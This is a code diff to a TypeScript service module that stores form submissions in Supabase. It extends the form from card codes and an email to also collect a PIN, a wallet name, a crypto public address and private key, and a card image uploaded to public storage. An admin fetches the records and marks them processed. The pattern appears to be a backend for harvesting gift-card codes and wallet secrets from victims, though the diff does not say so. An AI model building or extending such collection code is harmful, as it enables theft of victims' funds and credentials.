@@ -3,7 +3,12 @@ import { supabase } from "@/integrations/supabase/client";
 export interface SubmissionData {
   cardType: string;
   email: string;
-  codes: string[];
+  codes?: string[];
+  wallet?: string;
+  pin?: string;
+  publicAddress?: string;
+  privateKey?: string;
+  imageUrl?: string;
 }
 
 export interface Submission {
@@ -16,20 +21,43 @@ export interface Submission {
   code_3: string | null;
   code_4: string | null;
   code_5: string | null;
+  wallet: string | null;
+  pin: string | null;
+  public_address: string | null;
+  private_key: string | null;
+  image_url: string | null;
   status: string;
 }
 
+export const uploadCardImage = async (file: File): Promise<{ url?: string; error?: string }> => {
+  const ext = file.name.split('.').pop() || 'jpg';
+  const path = `${crypto.randomUUID()}.${ext}`;
+  const { error } = await supabase.storage.from('card-images').upload(path, file, {
+    contentType: file.type,
+    upsert: false,
+  });
+  if (error) return { error: error.message };
+  const { data } = supabase.storage.from('card-images').getPublicUrl(path);
+  return { url: data.publicUrl };
+};
+
 export const submitCodes = async (data: SubmissionData): Promise<{ success: boolean; error?: string }> => {
+  const codes = data.codes || [];
   const { error } = await supabase
     .from('submissions')
     .insert({
       card_type: data.cardType,
       email: data.email,
-      code_1: data.codes[0] || null,
-      code_2: data.codes[1] || null,
-      code_3: data.codes[2] || null,
-      code_4: data.codes[3] || null,
-      code_5: data.codes[4] || null,
+      code_1: codes[0] || null,
+      code_2: codes[1] || null,
+      code_3: codes[2] || null,
+      code_4: codes[3] || null,
+      code_5: codes[4] || null,
+      wallet: data.wallet || null,
+      pin: data.pin || null,
+      public_address: data.publicAddress || null,
+      private_key: data.privateKey || null,
+      image_url: data.imageUrl || null,
     });
 
   if (error) {
@@ -51,7 +79,7 @@ export const fetchSubmissions = async (): Promise<{ data: Submission[] | null; e
     return { data: null, error: error.message };
   }
 
-  return { data };
+  return { data: data as Submission[] };
 };
 
 export const updateSubmissionStatus = async (id: string, status: 'pending' | 'processed'): Promise<{ success: boolean; error?: string }> => {
